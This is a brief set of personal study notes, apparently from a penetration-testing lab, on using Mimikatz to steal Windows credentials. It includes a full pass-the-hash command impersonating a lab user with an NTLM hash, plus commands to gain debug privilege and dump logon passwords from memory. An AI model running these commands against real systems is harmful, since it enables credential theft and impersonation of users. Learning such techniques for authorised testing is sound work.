#mimikatz #pillaging #auth #crendentals #secretsdump #passtheticket 
- [GitHub - gentilkiwi/mimikatz: A little tool to play with Windows security](https://github.com/gentilkiwi/mimikatz)
- steals creds from windows memory
- use stolen creds to auth
- [Dumping User Passwords from Windows Memory with Mimikatz | Windows OS Hub (woshub.com)](https://woshub.com/how-to-get-plain-text-passwords-of-windows-users/)
- `mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit`  impersonate user julio using NTLM hash on the inlane domain then run CMD under the user context
- `privilege::debug` grant the current account the permissions to debug processes
- `sekurlsa::logonPasswords full` List active user sessions
- `misc::cmd` open CMD as user